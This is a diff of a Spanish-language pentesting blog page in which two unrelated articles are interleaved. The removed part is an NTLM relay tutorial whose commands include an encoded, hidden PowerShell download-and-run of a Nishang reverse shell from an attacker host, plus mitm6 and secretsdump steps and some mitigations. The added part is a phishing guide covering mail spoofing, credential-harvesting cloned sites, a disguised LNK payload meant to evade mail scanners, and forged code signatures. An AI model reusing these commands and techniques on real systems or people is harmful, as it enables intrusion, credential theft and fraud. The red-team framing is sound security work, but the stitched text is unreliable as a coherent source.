+<h4 id="recon-ng">Recon-NG</h4>
+<p>Recon-ng es uno de los DreamWorks más versátiles para el reconocimiento.</p>
+<p>El fue construido por Tim Tomes, quien desarrolló la herramienta para <strong>emular el mismo modelo interactivo que se encuentra en Metasploit</strong></p>
+<p>El framework se puede descargar en <a href="https://github.com/lanmaster53/RECON-NG">https://github.com/lanmaster53/RECON-NG</a>.</p>
+<p>**Recon-NG tiene varios módulos de reconocimiento disponibles, incluidas las búsquedas de dominio, la orientación de las redes sociales,</p>
+<p>Información de geo localización y muchos más. El módulo &ldquo;Profiler&rdquo; de Micah Hoffman es una herramienta fantástica para mirar hacia arriba</p>
+<p>Información del usuario en línea, y lo describe en detalle en su sitio.**</p>
+<p><img src="https://i.imgur.com/u9gMxjS.png" alt=""></p>
+<h3 id="metadatos">Metadatos</h3>
+<p>Es interesante analizar los metadatos de material audio visual, ya que podemos encontrar información como rutas de directorios, información del autor, información de la cámara, inclusive hasta coordenadas de localización.</p>
+<ul>
 <li>
-<p>El cliente intenta iniciar sesión en un servidor enviando un paquete <strong>NEGOTIATE_MESSAGE</strong></p>
+<p><strong>Exiftool</strong></p>
 </li>
 <li>
-<p>El servidor le responde con un <strong>CHALLENGE_MESSAGE</strong> para darle la oportunidad al cliente de que se identifique, Este desafío <strong>(o nonce)</strong> es un numero aleatorio que debe ser encriptado por el cliente con su hash de contraseña</p>
+<p><strong>Foca</strong></p>
 </li>
-<li>
-<p>Finalmente el cliente responde con un <strong>AUTHENTICATE_MESSAGE</strong> que incluye el desafío encriptado, el nombre de usuario, el nombre de host o el nombre del dominio.</p>
-</li>
-<li>
-<p>El servidor verifica el desafío con el hash de la contraseña y se asegura si es el correcto, para aceptar o denegar su autenticación</p>
-</li>
-</ol>
-<p> <img src="https://i.imgur.com/bCKr9FN.png" alt=""></p>
-<blockquote>
-<p>Nota los hashes Net-NTLMv2 no se pueden usar para ataques Pass-The-Hash (PTH) solo sirven para crackearlos con john o hashcat, los hashes NTLMv1 si sirven para Pass the hash.</p>
-</blockquote>
-<p> Entendiendo el concepto anterior procederemos a realizar un ataque <strong>NTLM Relay</strong> utilizando <strong>responder</strong> y <strong>ntlmrelay</strong> de impacket</p>
-<ol>
-<li>Identificamos nuevamente los hosts que no requieren firmado</li>
-</ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
-crackmapexec -t <span style="color:#ae81ff">200</span> smb 10.10.40.0/24 --gen-relay-list targets.txt
-
---gen-relays-list : Devuelve la dirección de todos aquellos hosts que no requieran SMB certificado <span style="color:#f92672">(</span>Vulnerables a distintos tipos de ataques de relay<span style="color:#f92672">)</span>
-
-</code></pre></div><p><img src="https://i.imgur.com/V3O0fJk.png" alt=""></p>
-<p>como hemos nombrado anteriormente <strong>SMB Signing</strong> es una función de seguridad de smb que evita los ataques de relay pidiendo la autenticidad del destinatario. Sin embargo es frecuente encontrarlo deshabilitado para admitir dispositivos heredados o mejorar la velocidad de la red.</p>
-<p>2.  Procedemos a deshabilitar el protocolo <strong>Smb y HTTP</strong> de la configuración del responder <code>/etc/responder/responder.conf</code> esto es porque <strong>ntlmrelay</strong>  utiliza los puertos <strong>SMB/HTTP</strong></p>
-<p><img src="https://i.imgur.com/I327HNU.png" alt=""></p>
-<ol start="3">
-<li>ejecutamos <strong>Ntlmrelay</strong> de <strong>Impacket</strong> para que se ponga a la espera por hashes capturados con el responder para luego intentar dumpear la sam con el mismo relay, en aquellos hosts que no requieran <strong>smb firmado</strong></li>
-</ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
-python3 ntlmrelayx.py  -smb2support -tf /tmp/AD/targets.txt
-
--smb2support : soporte de smbv2 antiguo
-
--tf : archivo que contiene los ip de los hosts que no requieren smb firmado, donde intentara dumpear la sam con el relay del hash capturado en el responder . <span style="color:#f92672">(</span>una ip por linea<span style="color:#f92672">)</span>
-
-</code></pre></div><p><img src="https://i.imgur.com/qPDYv56.jpg" alt=""></p>
-<p>Aparentemente hay cuentas en el dominio que poseen privilegios sobre otros hosts, y de los cuales utilizando ese relay  del usuario con privilegio, podemos DUMPEAR la <strong>SAM</strong> para despues poder realizar un pass the hash o intentar crackearlos.</p>
-<h2 id="ntlmrelay-with-proxy-socks">Ntlmrelay with Proxy socks</h2>
-<ol>
-<li>Similar al ataque anterior con la diferencia de que solo le agregamos el parámetro <code>-socks</code> para que inicie un proxy socks y lo ponga a la espera,  para eso primero iniciemos el <strong>responder</strong></li>
-</ol>
-<pre><code>
-responder -I ens38
-
-</code></pre><ol start="2">
-<li>nos aseguramos de que en nuestro archivo de configuración de <strong>proxychains</strong> <code>/etc/proxychains.conf</code> tengamos seteado el puerto correcto para el túnel socks que utilizaremos en el relay</li>
-</ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
-<span style="color:#f92672">[</span>ProxyList<span style="color:#f92672">]</span>
-
-<span style="color:#75715e"># add proxy here ...</span>
-
-<span style="color:#75715e"># meanwile</span>
-
-<span style="color:#75715e"># defaults set to &#34;tor&#34;</span>
-
-socks4  127.0.0.1 <span style="color:#ae81ff">1080</span>
-
-</code></pre></div><ol start="3">
-<li>ejecutamos el ntlmrelay para que inicie el servidor que retransmitirá el hash a nuestro túnel socks</li>
-</ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
-python3 ntlmrelayx.py -socks -smb2support -tf /tmp/AD/targets.txt
-
--socks : Utilizaremos un socket para tunnelizar el tráfico hacia nosotros
-
-</code></pre></div><p><img src="https://i.imgur.com/ChdwXmN.png" alt=""></p>
-<ol start="4">
-<li>como vemos tenemos una cuenta que tiene privilegios de administrador en otros equipos entonces  intentaremos autenticarnos a través del túnel con proxychains, sin especificar contraseña ya que utilizaremos el relay</li>
-</ol>
-<p><img src="https://i.imgur.com/F2ahhaO.png" alt=""></p>
-<p>así de sencillo nos <strong>logueamos</strong> utilizando el relay  que contiene lo hashes para la autenticación. Esto se puede puede aprovechar con herramientas como <strong>smbexec</strong>, <strong>psexec</strong>, <strong>wmiexec</strong> etc.</p>
-<h2 id="ntlmrelay-nishang">Ntlmrelay Nishang</h2>
-<p>Con ntlmrelay tenemos la capacidad de ejecutar comandos remotos, que podría ser bastante útil para obtener una reverse shell en este caso  ocultaremos la petición al recurso de nishang en base64  <code>Invoke-PowerShellTCP</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
-python3 ntlmrelayx.py -smb2support -tf /tmp/AD/target.txt -c <span style="color:#e6db74">&#39;powershell -nop -w hidden -enc aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADQAMAAuADIANQA6ADYAMAA2ADAALwBwAHMAaABlAGwAbAAuAHAAcwAxACIAKQAKAA==&#39;</span>
-
-</code></pre></div><p><img src="https://i.imgur.com/1P8KIbr.png" alt=""></p>
-<p>Obtenemos nuestra reverse shell =) .</p>
-<p><img src="https://i.imgur.com/NK1URsg.png" alt=""></p>
-<h2 id="ntlmrelay-con-secrets-dump">Ntlmrelay con Secrets Dump</h2>
-<p>utilizaremos el relay capturado  para poder volcar los hashes de <strong>SAM y LSASS secrets</strong> con la herramienta <strong>secretsdump</strong>. Esta técnica nos dará la posibilidad de movernos lateralmente ya que es probable que consigamos hashes de cuentas del dominio, o en el mejor de los casos cuentas de servicios con credenciales en texto plano</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
-proxychains python3 secretsdump.py dev/c.rodolfo@10.10.40.223 -no-pass
-
-</code></pre></div><p><img src="https://i.imgur.com/n59YHV7.png" alt=""></p>
-<h2 id="mitm6-with-ntlmrelay-ipv6-y-nishang">MITM6 With NtlmRelay IPV6 y Nishang</h2>
-<blockquote>
-<p>IPV6 es la versión más reciente de IPV4, y en muchos ámbitos un protocolo más descuidado en las compañías ya que uno generalmente se centra en mitigar vulnerabilidades del protocolo más usado hasta el momento <strong>(IPV4)</strong> aunque en unos no será así.</p>
-</blockquote>
-<p>a continuaciòn haremos una prueba haciendo un ataque <strong>mitm6</strong> junto con <strong>ntlmrelay</strong> para inyectar comandos haciendo una solicitud  a un servidor web con el recurso de nishang nuevamente</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
-<span style="color:#75715e"># Mitm6</span>
-
-mitm6 -i ens38 -d dev.evilcorp.local --ignore-nofqdn
-
--i : interface
-
--d : dominio
-
---ignore-nofqdn : ignora las consultas dhcpv5 que no contengan el nombre de domini ocompleto
-
-<span style="color:#75715e"># Ntlmrelay</span>
-
-python3 ntlmrelayx.py -t smb://10.10.40.226 -c <span style="color:#e6db74">&#39;c:\windows\SysWow64\WindowsPowershell\v1.0\powershell.exe -nop -w hidden -enc ADAALwBzAGgAZQBsAGwALgB[..B64-Request..]wAHMAMQAiACkACgA=&#39;</span> -wh 10.10.40.225 -smb2support
-
--t : target
-
--c : commando a ejecutar
-
--wh : habilita el servicio de un archivo WPAD <span style="color:#f92672">(</span>Web Proxy Auto-Discovery<span style="color:#f92672">)</span>  para la autenticación del proxy, o sea nosotros somos el servicio en este caso
-
-<span style="color:#75715e"># Http.server</span>
-
-python3 -m http.server <span style="color:#ae81ff">8080</span>
-
-</code></pre></div><p> <img src="https://i.imgur.com/LWxYDVc.png" alt=""></p>
-<h2 id="mitm6-con-ntlmrelay--socks">MITM6 con NTLMRELAY + Socks</h2>
-<p> La intención es la misma con la diferencia de que guardamos el relay capturado con ntlmrelay  para después tunelizarlo con proxychains con el fin de lograr autenticarnos.</p>
-<p> ```shell</p>
-<p> mitm6 -i ens38 -d dev.evilcorp.local &ndash;ignore-nofqdn</p>
-<p> python3 ntlmrelayx.py -t smb://10.10.40.226 -wh 10.10.40.225 -smb2support -socks -debug</p>
-<p> ```</p>
-<p><img src="https://i.imgur.com/Ox6sYjj.png" alt=""></p>
-<p>como vemos en la imagen anterior, tenemos un relay capturado con el flag de <strong>AdminStatus</strong> en <strong>True</strong>, o sea que podríamos utilizarlo tranquilamente  para autenticarnos a ese host en particular con el usuario  **Samuel Adam **</p>
+</ul>
 <hr>
-<h2 id="mitigación">Mitigación</h2>
-<ol>
-<li> <strong>Habilitar las firmas de SMB</strong></li>
-</ol>
-<p>2.  <strong>Deshabilitar LLMNR</strong></p>
-<p>3.  <strong>Deshabilitar NBT-NS</strong></p>
-<p>4.  <strong>Deshabilitar IPV6</strong></p>
-<p>5.  <strong>Monitorear el trafico</strong></p>
-<h3 id="habilitando-la-firma-de-smb">Habilitando la firma de SMB</h3>
-<p>Habilitando la firma de smb evitaremos por completos los ataques de retransmisión <strong>(relay)</strong> vistos anteriormente ya que el sujeto tendrá que comprobar su autenticidad, básicamente es como agregarle un sello a nuestro paquetes a la hora de autenticarnos, y quien no posea ese sello en la red directamente no podra autenticarse independiente de si posea los hashes o credenciales validas en la red.</p>
-<p>Para esto podemos crear <strong>GPOS</strong> en el dominio o simplemente agregando la configuración al equipo local afectado, nos vamos a las políticas de grupo</p>
-<p><code>Configuración del equipo/Políticas/Configuración de Windows/Configuración de seguridad/Políticas locales/Opciones de seguridad</code></p>
-<p>Doble clic en <strong>Servidor de red de Microsoft: Firmar digitalmente las comunicaciones (siempre)</strong> y habilitarlo.</p>
-<p>deben tener en cuenta que el trafico será algo más lento, ya que le está agregando una capa de seguridad extra y también que no afecte a dispositivos heredados en la red</p>
-<p><img src="https://i.imgur.com/6HVYRNR.png" alt=""></p>
-<h3 id="deshabilitar-llmnr">Deshabilitar LLMNR</h3>
-<p><strong>Deshabilitar LLMNR y NTB-NS evitará que herramientas como Responder capturen las credenciales</strong></p>
-<p>Abra el Editor de políticas de grupo nuevamente Vaya a  :</p>
-<p><code>Política de equipo local &gt; Configuración del equipo &gt; Plantillas administrativas &gt; Red &gt; Cliente DNS </code></p>
-<p>En Cliente DNS, asegúrese de que <strong>&ldquo;Desactivar resolución de nombre de multidifusión&rdquo;</strong> este en Habilitado</p>
-<p><img src="https://i.imgur.com/3Sb9qFp.png" alt=""></p>
-<h3 id="deshabilitar-nbt-ns">Deshabilitar NBT-NS</h3>
-<p>Abra sus conexiones de red , va a la propiedad de su adaptador</p>
-<ol>
+<h4 id="web-spidering-">Web Spidering 🕸</h4>
+<p>Si bien no es puramente &ldquo;Recon&rdquo;, ya estaríamos rosando el escaneo activo, el Spidering de sitios web mas bien es enumerar posibles rutas hacia recursos que no se están listando , o bien ocultando en los motores de búsquedas para eso está el fichero <strong>robots.txt</strong> en el podemos espeficar que mostrar e ingorar cuando un crawler de búsqueda reconoce nuestro sitio web.</p>
+<p>Hay muchas herramientas que puedes usar para el <strong>Spidering de servidores web</strong>:</p>
+<ul>
 <li>
-<p>selecciona el protocolo <strong>(TCP/IPV4)</strong> haga clic en propiedades</p>
+<p>wget</p>
 </li>
 <li>
-<p>En la pestaña general, haga clic en avanzado</p>
+<p>BURP</p>
 </li>
 <li>
-<p>navegue hasta la pestaña &lsquo;WINS&rsquo; y luego desactive NetBios sobre &lsquo;TCP/IP&rsquo;</p>
-</li>
-</ol>
-<p><img src="https://i.imgur.com/1LE55ru.png" alt=""></p>
-<h3 id="desactivando-ipv6">Desactivando IPV6</h3>
-<ol>
-<li>
-<p>similar al método anterior nada más que en las propiedades del adaptador y desactivamos el protocolo ipv6</p>
+<p>ZAP</p>
 </li>
 <li>
-<p>también puede especificarle a su DHCP server que no asigne direcciones por IPV6</p>
+<p>Siempre busque el archivo <strong>robots.txt</strong> en el raíz de un sitio web!</p>
 </li>
-</ol>
-<p><img src="https://i.imgur.com/9VQGUxp.png" alt=""></p>
-<p>Llegamos al fin =) , En proximos articulos  intentaremos tocar la mayoria de vulnerabilidades conocidas dentro de un Directorio activo en sí.</p>
+</ul>
+<p>ejemplo:</p>
+<p><a href="https://www.midominio.eu/robots.txt">https://www.midominio.eu/robots.txt</a></p>
+<ul>
+<li>Dorking para encontrar <strong>robots.txt</strong></li>
+</ul>
+<pre><code>
+site: &quot;robots.txt&quot; &quot;disallow:&quot; filetype:txt
+
+</code></pre><p><img src="https://i.imgur.com/7xb5spe.png" alt=""></p>
+<h3 id="una-vez-que-ya-hemos-recopilado-informacion-de-nuestro-target">Una vez que ya hemos recopilado informacion de nuestro target</h3>
+<p>Debemos comenzar a analizar la información y hacer <strong>&lsquo;Conexiones&rsquo;</strong> como :</p>
+<ul>
+<li>
+<p>Relaciones personales/empresariales.</p>
+</li>
+<li>
+<p>Organizaciones/Pasatiempos relacionados</p>
+</li>
+<li>
+<p>Funciones/funciones de trabajo</p>
+</li>
+<li>
+<p>Ubicaciones</p>
+</li>
+<li>
+<p>Opiniones/Preferencia</p>
+</li>
+</ul>
+<p>con el fin de armar un perfil, armar el muñeco.</p>
+<p>Esto no tiene estar completo 100% desde el principio de hecho, es probable que tenga que descubrir los usuarios/emails específicos, especialmente si se planifican ataques avanzados como ataques de Spear Phising.</p>
+<h4 id="ejemplo-de-un-perfil-de-prueba">Ejemplo de un Perfil de Prueba</h4>
+<p>Un perfil de muestra de un objetivo puede incluir:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">
+Nombre(s)
+
+Direcciones de correo electrónico y números de teléfono.
+
+Direcciones físicas
+
+Miembros de la familia/Relaciones
+
+Aficiones
+
+Organizaciones/causas afiliadas
+
+</code></pre></div><p><strong>Direcciones físicas</strong>: son generalmente para organizaciones e instalaciones relacionadas con el trabajo, No queremos acechar a la gente y esto suele estar fuera de los límites del alcance y las reglas de compromiso</p>
+<p><strong>Miembros/relaciones familiares</strong>: si puede aprender los nombres de familia o los intereses de alguien, esto puede resultar útil para</p>
+<p>Engañar a una persona para que ella pulse un link o abra un correo electrónico.</p>
+<p><strong>En la Ingeniería social necesitas ser consciente que usas tácticas que violan la ética fundamental.</strong></p>
+<p>Aunque los verdaderos atacantes pueden no tener límites sobre cómo realizan la ingeniería social, es muy poco probable que estemos en esa misma posición</p>
+<p><img src="https://i.imgur.com/jKDrH7B.png" alt=""></p>
+<h4 id="cómo-alguien-puede-suplantar-el-correo-de-un-dominio-u-otra-persona">¿Cómo alguien puede suplantar el correo de un dominio u otra persona?</h4>
+<h3 id="mail-spoofing">Mail Spoofing</h3>
+<p>Dicho de una forma sencilla, el Mail Spoofing es cuando alguien nos envía un correo donde el campo de entrada <strong>FROM</strong> del remitente es falso , de forma que podrían decirte que el correo te lo ha enviado una persona, empresa o entidad bancaria pero que realmente no son ellos los que realizan este envío.</p>
+<p>&lsquo;Alguien que dice ser pero que en realidad no es, te contacta por un correo un mensaje o una llamada para logar extraer información sensible para su causa&rsquo;</p>
+<p>bien volviendo a técnica de mail spoofing generalmente utilizada demos tener en cuenta 3 protocolos</p>
+<ul>
+<li>
+<p><strong>SPF</strong>, <strong>DKIM</strong> y <strong>DMARC</strong></p>
+</li>
+<li>
+<p><strong>DKIM</strong> : permite firmar el correo con tu dominio mediante claves públicas indicadas en las zonas de tu dominio, para asegurar que ha sido enviado desde tu servidor y ha sido incerceptado ni modificado.</p>
+</li>
+<li>
+<p><strong>SPF</strong> : Se encarga de certificar que IP puede mandar correos utilizando el DOMINIO <strong>(Lo podemos chequear con nslookup)</strong></p>
+</li>
+<li>
+<p><strong>Dmarc</strong>: Este registro indica qué hacer cuando dan error los registros anteriores es complementario de SPF y DKIM</p>
+</li>
+<li>
+<p>son protocolos de autenticación de emails que certifican a los servidores de correo como Gmail, Yahoo o Hotmail que el sender que está enviando un email es seguro y es quien dice ser. En otras palabras, es como si a tus emails les pusieran una pulsera o una medalla que diga “hey, es un remitente seguro, puede pasar”</p>
+</li>
+</ul>
+<blockquote>
+<p>Utiliza registro SPF para evitar el Mail Spoofing.</p>
+</blockquote>
+<p><strong>es decir si el encargado en esta área de su organización no ha registrado o se ha olvidado ante la autoridad dos de registrar que pertenece a tal organización</strong>, un atacante puede suplantar el correo de un dominio.</p>
+<ul>
+<li>
+<p>Checker de comprobacion Dmarc</p>
+</li>
+<li>
+<p><a href="https://dmarcian.com/">https://dmarcian.com/</a></p>
+</li>
+<li>
+<p><a href="https://mxtoolbox.com/">https://mxtoolbox.com/</a></p>
+</li>
+</ul>
+<p><img src="https://i.imgur.com/6qnHe5x.png" alt=""></p>
+<p>Le sugiero que investigue en profundidad estos tópicos, ya que en este artículo se basa en un enfoque más práctico y superficial que en cuestiones meramente técnicas en las que es interesantes de aprender cómo funcionan.</p>
+<p>Con esta información en poder sabemos que podemos suplantar el correo de un dominio o bien hacerse pasar por otra persona, por ejemplo alguien de recursos humanos o un jefe de otro departamento. la creatividad es la clave.</p>
+<p><strong>Chequeando SPF</strong></p>
+<p><img src="https://i.imgur.com/xYorArp.png" alt=""></p>
+<p>vemos que en el registro <strong>spf</strong> podemos identificar servidores de correo e incluso rangos de ip</p>
+<ul>
+<li>
+<p>los rangos de ip son a lo que se les permite enviar correo electrónico en el dominio</p>
+</li>
+<li>
+<p><strong>Tenga en cuenta el parametro al final de este campo (en este caso -all)</strong></p>
+</li>
+</ul>
+<p>Hay un número de políticas que pueden afectar la prueba de pisan por email:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">- **-all** <span style="color:#f92672">(</span>rechaza o falla si las pruebas no coinciden absolutamente<span style="color:#f92672">)</span>
+
+- **~all** <span style="color:#f92672">(</span>rechazo liviana; Marca el correo como sospechoso pero lo acepta<span style="color:#f92672">)</span>
+
+- **+all** <span style="color:#f92672">(</span>lo acepta independientemente de donde venga<span style="color:#f92672">)</span>
+
+- **?all** <span style="color:#f92672">(</span>aceptan el correo, pero no pueden clasificarlo negativamente o positivamente<span style="color:#f92672">)</span>
+</code></pre></div><p>Si consultamos otro dominio, encontraremos una cantidad significativa de otras direcciones IP que también se deben considerar.</p>
+<p>Motivos por los cuales el correo enviado podría ser bloqueado</p>
+<p><strong>Enlaces sospechosos</strong></p>
+<ul>
+<li>
+<p>dominios inusuales</p>
+</li>
+<li>
+<p>Esquemas de codificación extraños</p>
+</li>
+<li>
+<p>mal gramática y ortografía.</p>
+</li>
+<li>
+<p>Replicar mensajes de muestras del mundo real.</p>
+</li>
+<li>
+<p>Uso de servicios compartidos o su propia IP</p>
+</li>
+</ul>
+<p><strong>Puede consultar dominios hasta encontrar uno que no contenga registro y estos los dominios pueden falsificarse fácilmente usando los métodos convencionales.</strong></p>
+<ul>
+<li>Enviando un correo falso.</li>
+</ul>
+<p><img src="https://i.imgur.com/mHIpK40.png" alt=""></p>
+<h5 id="que-funciona-usualmente-de-este-ataque">Que funciona usualmente de este ataque</h5>
+<p>• Restablecer contraseña del usuario</p>
+<p>• Entrega de algun paquetes de Amazon, Alibaba, Mercadolibre</p>
+<p>• Un incidente de recursos humanos (bien planeado)</p>
+<p>• Transferencias de archivos falsos</p>
+<p>• Todo lo que al sujeto le apasione y pueda interesarle (esta información está en sus redes sociales)</p>
+<p>por ejemplo.</p>
+<p><strong>Puede enviar correos invitando a los clientes a una hermosa barbacoa de la compañía con entretenimiento y con presencia de algunas celebridades pero que solo hay reservas limitadas así que deberían reservar su espacio, dentro de las 24/48 horas próximas.</strong></p>
+<p>Para que en realidad los empleados tengan que loguearse en un sitio web clonado de la compañia y se les invita a introducir sus credenciales de accesso para obtener su &lsquo;Prestigioso espacio reservado&rsquo; (lol). para después ser reenviados con un redirect <strong>302</strong> a otro sitio legitimo de la compañia, o bien con una ventana popup notificando que su espacio a sido reservado correctamente.</p>
+<p><strong>El phising es un ataque de creatividad de distintas formas, mantente simple. Manteniendo un enojo en los controles de seguridad y defensas, y cuando el usuario cliquea, necesitamos un payload</strong></p>
+<blockquote>
+<p><strong>La habilidad de evasión en estos casos juega un rol fundamental</strong></p>
+</blockquote>
+<p>• El payload normalmente se centra en:</p>
+<ul>
+<li>
+<p>Un backdoor que da acceso al atacanete</p>
+</li>
+<li>
+<p>un tracker para rastrear clicks</p>
+</li>
+<li>
+<p>recoger credenciales</p>
+</li>
+</ul>
+<hr>
+<h2 id="segunda-parte">Segunda Parte</h2>
+<ul>
+<li>
+<p>Vishing</p>
+</li>
+<li>
+<p>Clonando Sitios</p>
+</li>
+</ul>
+<h3 id="què-es-vishing">¿Què es Vishing?</h3>
+<p>a diferencia del pisan es algo más sofisticados ya que le sumamos la interacción con teléfonos móviles y servicios de plataformas que normalmente las personas suelen usar como whatsapp o cualquier mensajero en línea.</p>
+<p>El <strong>vishing</strong> es la suplantación de empresas o entidades de confianza para obtener datos personales a través de una simple llamada esto sigue siendo un intento de estafa muy habitual en todo el mundo</p>
+<p>Generalmente pretende suplantar la identidad de una entidad o persona con el fin de lograr su cometido que es extraer información privilegiada.</p>
+<p>Un Vhishing es un mensaje (sms)/whatsapp o un llamada para que el usuario entregue información o realice comportamientos manipulados o bien entregue datos o acceso a un sistema.</p>
+<ul>
+<li>
+<p>Llamadas</p>
+</li>
+<li>
+<p>Mensajes de voz</p>
+</li>
+<li>
+<p>SMS/WHATSAPP</p>
+</li>
+</ul>
+<p><strong>Sitios Comunes para realizar Sms Spoofing</strong></p>
+<p><a href="https://www.twilio.com/es-mx/">Twilio</a></p>
+<p><a href="https://www.smsgang.com/">SmsGang</a></p>
+<p><img src="https://i.imgur.com/uNLRVwD.png" alt=""></p>
+<p>A esto puedes sumarle otros vectores de ataque como los vistos anteriormente</p>
+<ul>
+<li>correo, con un enlace web (probablemente con un acortador de urls para disfrazar la dirección original).</li>
+</ul>
+<h4 id="clonado-de-sitios-con-formularios-de-logueo">Clonado de sitios con formularios de logueo</h4>
+<p>En esta sección exploraremos las técnicas de clonación de sitios para obtener información sensible</p>
+<p>En esta etapa debemos intentar tener en nuestra caja de herramientas, templates o plantillas de sitios clonados de plataformas populares, con el fin de capturar credenciales desde un formulario donde el usuario ingresara sus datos.</p>
+<p>debemos usar certificados SSL que podemos conseguir en <a href="www.namecheap.com">namecheap</a> para dar una sensación de seguridad.</p>
+<p><img src="https://i.imgur.com/DpReiPA.png" alt=""></p>
+<h4 id="setoolkit">SeToolKit</h4>
+<p><strong>SEToolkit</strong> es un programa de TrustestSEC que tiene muchas funciones para ingeniera social que va desde el robo de credenciales por sitios clonados, hasta la realización de cargas útiles de Metasploit.</p>
+<p>Para clonar sitios :</p>
+<ul>
+<li>
+<p><strong>2) Website Attack Vectors</strong></p>
+</li>
+<li>
+<p><strong>5) Web Jacking Attack Method</strong></p>
+</li>
+<li>
+<p><strong>3) Custom Import</strong></p>
+</li>
+</ul>
+<p>Indicamos el path de nuestro sitio clonado y el ip de callback donde se enviaran los datos, esta técnica podría hacerse manual, simplemente alojando un sitio en un servidor con un certificado de dominio similar a la de la compañia que quiere spoofear, incluso se podría enviar los inputs del usuario a una base de datos liviana como sqlite</p>
+<p><img src="https://i.imgur.com/vtMbsVv.jpg" alt=""></p>
+<hr>
+<h3 id="creaciones-de-payloads">Creaciones de Payloads</h3>
+<p>Solo rasgaremos la superficie en este tema, ya que será un tema que tocaremos en post posteriores y le dedicaremos una sección entera ya que es algo extenso.</p>
+<p>Uno de los principios aplicados a los payloads es que traten de unirse con el binario/lnk/documento ofimático/instalador o lo que sea que utilicemos para el compromiso inicial.</p>
+<p>Puede visitar el sitio de <a href="https://attack.mitre.org/tactics/TA0001/">Mitre ATT&amp;CK</a> para analizar cuáles son los ataques más comunes.</p>
+<p>Haremos una pequeña POC para esto por eje:</p>
+<p>Enviar un <strong>lnk malicioso</strong> comprimido en un archivo zip con contraseña por correo , al estar encriptado con la contraseña lo más probable es que los scanners de correo no lo detecten, estó con el fin de que cuando el usuario descomprima el fichero obtenga un &ldquo;pdf&rdquo;, cuando en realidad solo es un acceso directo o más bien un <strong>&lsquo;lnk&rsquo;</strong> con <strong>icono de un PDF</strong> es un payload que puede ejecutar acciones en su pc. y podría pasar desapercibido ya que después de haber ejecutado su acción maliciosa, puede abrirle un pdf al final para que el usuario no se de cuenta de lo que sucedió.</p>
+<p><img src="https://i.imgur.com/hSZjNz0.png" alt=""></p>
+<p>Así como ejecuto un calculador como prueba de concepto también puede realizar acciones algo más adecuadas para evadir AV/EDR.</p>
+<p>Como por ejp: <strong>hacer una petición a un sitio web con un recurso que aloja en su interior un shellcode ofuzcado o encriptado para almacenarlo en memoria y después invocarlo con un rutina que remplaze los caracteres ofuzcados o bien desencripte la carga.</strong></p>
+<p>Así como también puede enviar un documento ofimático que contenga código malicioso que se active cuando el usuario haga clic en &lsquo;entable contento&rsquo; para darle ejecución a la macro que correrá el código oculto a simple vista en el documento, lo más probable es que sea puerta trasera embebida en él.</p>
+<p><strong>en el caso de que sean binarios necesitamos por ejemplo que el binario de compromiso estén firmados, y si es posible por entidades de confianza</strong>.</p>
+<p>(Para esto puede agarrar instaladores de confianza o binarios e inyectarle el código con <strong>&ldquo;MSFVENOM&rdquo;</strong> - <strong>&ldquo;Shellter&rdquo;</strong>)</p>
+<p>No esta demás decir que necesitamos que tengan iconos que se vean ‘confiables’  , y la información necesaria para parecer legítimo con el fin de no alertar al AV/DEFENDER como la versión, el proveedor del software.</p>
+<p>Una herramienta útil interesante para firmar binarios es:</p>
+<p>[SigThief]https://github.com/secretsquirrel/SigThief de SecretSquirrel</p>
+<p>Extraerá una firma de un archivo PE firmado y se la agregará a otro, arreglando la tabla de certificados para firmar el archivo. No es una firma valida, pero ya está firmado y ese es el punto.</p>
+<h3 id="reporte">Reporte</h3>
+<p>El reporte es lo que garantizara que hayamos realizado nuestro trabajo de investigación. Para eso debemos tener en cuenta lo siguiente</p>
+<h4 id="antes-del-reporte">Antes del reporte</h4>
+<p>Gran parte de las campañas de ingeniería social está vinculada a Documentación y resultados de búsquedas.</p>
+<ul>
+<li>
+<p>Todo el trabajo debe tener un seguimiento, incluso las llamadas deben poder grabarse</p>
+</li>
+<li>
+<p>Información de grabación</p>
+</li>
+<li>
+<p>Pequeñas grabadoras de voz, o su teléfono.</p>
+</li>
+<li>
+<p>Fotografías</p>
+</li>
+<li>
+<p>Cámaras digitales para reconocimiento, o su teléfono</p>
+</li>
+</ul>
+<h4 id="el-reporte">El reporte</h4>
+<p>Debe ser de unas pocas páginas como máximo 3 paginas, pero bien detalladas y con información precisa o lo más cercano a ello, con una breve explicación del projecto es decir quien la realiza, cual es el fin , y el alcance del mismo.
+en  conclusión debemos colocar los resultados dependiendo su nivel de criticidad como</p>
+<ul>
+<li>
+<p>bajo (green)</p>
+</li>
+<li>
+<p>medio (yellow)</p>
+</li>
+<li>
+<p>alto (red)</p>
+</li>
+</ul>
+<p><strong>El phishing es una de las tácticas más efectivas según estatiisticas de compromisos iniciales, el arma mas fuerte para combatirla es solamente usar el sentido común</strong></p>
 
     </div>
     <div class="post-footer">
